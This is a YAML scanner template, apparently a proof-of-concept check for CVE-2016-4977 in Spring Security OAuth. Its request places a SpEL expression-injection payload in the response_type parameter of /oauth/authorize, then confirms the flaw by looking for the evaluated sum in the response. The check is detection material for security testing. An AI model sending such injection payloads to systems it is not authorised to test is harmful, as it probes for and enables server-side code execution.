name: poc-yaml-spring-cve-2016-4977
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: /oauth/authorize?response_type=${{{r1}}+{{r2}}}&client_id=acme&scope=openid&redirect_uri=http://test
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
    follow_redirects: false
    expression: >
      response.status == 400 && response.body.bcontains(bytes(string(r1 + r2)))
detail:
  Affected Version: "spring(2.0.0-2.0.9 1.0.0-1.0.5)"
  author: hanxiansheng26(https://github.com/hanxiansheng26)
  links:
    - https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977
